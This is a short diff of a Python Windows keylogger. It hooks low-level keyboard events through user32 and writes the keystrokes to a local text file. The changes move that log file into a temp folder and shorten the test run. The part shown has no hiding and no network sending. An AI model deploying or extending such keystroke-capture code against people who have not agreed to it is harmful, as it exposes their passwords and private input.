@@ -2,9 +2,13 @@ import ctypes
 from ctypes import windll,byref,c_int,c_void_p, POINTER, CFUNCTYPE
 from ctypes.wintypes import WPARAM, LPARAM, MSG, DWORD
 import threading
+from pathlib import Path
+import os
 import time
+
 from handler_state import HandlerState
 from vkcode import VK_CODE, VK_SHIFT, VK_CAPS_LOCK, NormalChar
+
 
 user32 = windll.user32
 
@@ -16,7 +20,7 @@ msg = MSG()
 hook = None
 stop = False
 
-FILE_PATH = "logged_key.txt"
+FILE_PATH = os.path.join(Path(__file__).parent.absolute(),"temp\\logged_key.txt")
 file = None
 
 class KBDLLHOOKSTRUCT(ctypes.Structure):
@@ -145,5 +149,5 @@ class KeystrokeHandler:
 if __name__ == "__main__":
     a = KeystrokeHandler(FILE_PATH)
     a.Hook()
-    time.sleep(5)
+    time.sleep(2)
     a.Unhook()
